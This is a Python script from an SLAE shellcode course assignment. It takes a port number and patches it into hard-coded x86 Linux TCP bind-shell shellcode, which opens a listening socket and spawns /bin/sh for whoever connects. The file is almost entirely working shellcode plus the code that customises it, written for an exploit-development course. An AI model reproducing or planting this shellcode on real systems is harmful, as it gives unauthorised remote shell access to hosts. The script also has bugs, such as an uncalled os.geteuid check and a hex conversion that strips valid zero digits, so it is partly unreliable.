#!/usr/bin/env python
# SLAE assignment 1
# TCP bind shell port wrapper
# Author: PA-7854 ( - @_Kiewicz)
# Simple wrapper to change port being binded directly in shellcode


import sys
import os


if len(sys.argv) != 2:
    print("Usage: " + sys.argv[0] + " [PORT]")
    print("[!] Remember: Ports under 1024 should be run under root")
    exit(1)

port = int(sys.argv[1])

if port < 1024 and os.geteuid != 0:
    print("[E] To bind a port number < 1024 you need to be root")
    exit(2)

# Remove 0x char suffix
port = hex(port).strip('0x')

# TODO: Workaround for ports containing only 1 hex character

shellcode = ("\\x31\\xdb\\x31\\xc9\\x31\\xf6\\xf7\\xe3\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x66\\xb3\\x0e\\x6a\\x04\\x54\\x6a\\x02\\x6a\\x01\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x02\\x31\\xc9\\x66\\x51\\x66\\x68\\x30\\x39\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x56\\x52\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x56\\x56\\x52\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x3f\\x89\\xd3\\x89\\xf1\\xcd\\x80\\xb0\\x3f\\xb1\\x01\\xcd\\x80\\xb0\\x3f\\xb1\\x02\\xcd\\x80\\xb0\\x0b\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xf1\\x89\\xf2\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80") 
# Get offset, defaults to port 12345 = 0x3039
offset = shellcode.index("\\x30\\x39")
splitted = list(shellcode)

splitted[offset:offset+8] = '\\x' + str(port[0:2]) + '\\x' + str(port[2:4]) 

shellcode = ''.join(splitted)

if '\\x00' in shellcode:
    print("[E] Your shellcode contains NULL bytes, please choose another port")
    exit(3)


print("New shellcode is: " + shellcode)
